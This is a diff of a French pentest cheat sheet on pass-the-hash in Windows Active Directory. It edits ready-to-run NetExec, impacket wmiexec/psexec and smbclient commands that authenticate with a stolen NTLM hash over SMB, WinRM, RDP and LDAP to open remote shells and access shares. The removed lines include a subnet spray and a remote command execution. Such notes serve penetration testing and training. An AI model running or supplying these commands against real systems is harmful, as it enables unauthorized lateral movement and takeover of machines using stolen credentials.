@@ -83,39 +83,36 @@ Authentification avec le hash NTLM directement, sans le mot de passe en clair. F
 
 > Limitation : depuis le patch 2014, PtH ne fonctionne qu'avec le compte **Administrator local intégré** (RID 500) et les comptes de domaine. Les autres comptes admin locaux sont bloqués par défaut.
 
-**nxc — spray sur un subnet (valide pour SMB, WinRM, RDP, LDAP)**
+**NetExec**
 
 ```bash
 # SMB — identifier les machines où le hash est valide (Pwn3d! = admin local)
-nxc smb <IP_RANGE> -u Administrator -H '<NTLM_HASH>'
+nxc smb <IP> -u Administrator -H '<NTLM_HASH>'
 
 # WinRM
-nxc winrm <IP_RANGE> -u Administrator -H '<NTLM_HASH>'
+nxc winrm <IP> -u Administrator -H '<NTLM_HASH>'
 
 # RDP
-nxc rdp <IP_RANGE> -u Administrator -H '<NTLM_HASH>'
+nxc rdp <IP> -u Administrator -H '<NTLM_HASH>'
 
 # LDAP
-nxc ldap <IP_RANGE> -u Administrator -H '<NTLM_HASH>'
-
-# Exécuter une commande
-nxc smb <IP_CIBLE> -u Administrator -H '<NTLM_HASH>' -x "whoami"
+nxc ldap <IP> -u Administrator -H '<NTLM_HASH>'
 ```
 
 **impacket**
 
 ```bash
 # shell via WMI
-impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_HASH> Administrator@<IP_CIBLE>
+impacket-wmiexec -hashes :'<NTLM_HASH>' Administrator@<IP_CIBLE>
 
 # shell via PsExec (crée un service)
-impacket-psexec -hashes 00000000000000000000000000000000:<NTLM_HASH> Administrator@<IP_CIBLE>
+impacket-psexec -hashes :'<NTLM_HASH>' Administrator@<IP_CIBLE>
 ```
 
-**smbclient — accéder à un partage**
+**smbclient**
 
 ```bash
-smbclient \\\\<IP_CIBLE>\\<SHARE> -U Administrator --pw-nt-hash <NTLM_HASH>
+smbclient \\\\<IP_CIBLE>\\<SHARE> -U Administrator --pw-nt-hash '<NTLM_HASH>'
 ```
 
 **evil-winrm**
